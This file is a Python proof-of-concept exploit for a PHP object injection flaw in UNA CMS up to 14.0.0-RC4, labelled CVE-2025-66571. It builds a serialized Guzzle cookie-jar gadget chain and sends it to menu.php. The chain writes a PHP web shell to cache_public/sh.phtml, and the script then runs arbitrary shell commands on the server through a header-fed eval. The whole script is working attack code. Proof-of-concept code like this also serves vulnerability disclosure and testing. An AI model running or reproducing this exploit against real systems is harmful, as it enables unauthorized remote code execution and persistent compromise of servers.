#!/usr/bin/env python3
import requests
import sys
import base64
import time

class UNACMSExploit:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.shell_path = "cache_public/sh.phtml"
        self.session = requests.Session()

    def generate_payload(self):
        shell_code = '<?php eval(base64_decode($_SERVER["HTTP_C"])); ?>'
        
        set_cookie = (
            'O:27:"GuzzleHttp\\Cookie\\SetCookie":1:{'
            's:33:"\x00GuzzleHttp\\Cookie\\SetCookie\x00data";a:2:{'
            's:7:"Expires";s:0:"";'
            f's:5:"Value";s:{len(shell_code)}:"{shell_code}";'
            '}}'
        )
        
        payload = (
            'O:31:"GuzzleHttp\\Cookie\\FileCookieJar":3:{'
            's:41:"\x00GuzzleHttp\\Cookie\\FileCookieJar\x00filename";'
            f's:{len(self.shell_path)}:"{self.shell_path}";'
            's:52:"\x00GuzzleHttp\\Cookie\\FileCookieJar\x00storeSessionCookies";b:1;'
            's:36:"\x00GuzzleHttp\\Cookie\\CookieJar\x00cookies";a:1:{'
            f'i:0;{set_cookie}'
            '}}'
        )
        return payload

    def inject_object(self):
        print("[*] Injecting PHP object...")
        payload = self.generate_payload()
        
        headers = {
            "X-Requested-With": "XMLHttpRequest",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        
        data = {
            "o": "sys_set_acl_level",
            "a": "SetAclLevel",
            "level_id": "1",
            "profile_id": payload
        }
        
        try:
            resp = self.session.post(
                f"{self.target_url}/menu.php",
                headers=headers,
                data=data,
                timeout=30
            )
            print(f"[*] Injection response: {resp.status_code}")
            return True
        except Exception as e:
            print(f"[-] Injection failed: {e}")
            return False

    def execute_command(self, cmd):
        php_code = f"print '____'; print shell_exec(base64_decode('{base64.b64encode(cmd.encode()).decode()}')); print '____';"
        
        headers = {
            "C": base64.b64encode(php_code.encode()).decode()
        }
        
        try:
            resp = self.session.get(
                f"{self.target_url}/{self.shell_path}",
                headers=headers,
                timeout=30
            )
            
            if resp.status_code == 200 and "____" in resp.text:
                start = resp.text.find("____") + 4
                end = resp.text.rfind("____")
                if start < end:
                    return resp.text[start:end]
            return None
        except Exception as e:
            print(f"[-] Command execution failed: {e}")
            return None

    def verify_vulnerability(self):
        print("[*] Verifying vulnerability...")
        result = self.execute_command("id")
        if result:
            print(f"[+] Command executed successfully!")
            print(f"[+] Output: {result.strip()}")
            return True
        return False

    def exploit(self):
        print(f"[*] Target: {self.target_url}")
        
        if not self.inject_object():
            return False
        
        time.sleep(2)
        
        return self.verify_vulnerability()


def main():
    if len(sys.argv) < 2:
        target_url = "http://localhost:8089"
    else:
        target_url = sys.argv[1]
    
    print("=" * 60)
    print("UNA CMS <= 14.0.0-RC4 PHP Object Injection PoC")
    print("CVE-2025-66571")
    print("=" * 60)
    
    exploit = UNACMSExploit(target_url)
    
    if exploit.exploit():
        print("\n[+] VULNERABLE - Exploitation successful!")
        return 0
    else:
        print("\n[-] Exploitation failed or target not vulnerable")
        return 1


if __name__ == "__main__":
    sys.exit(main())
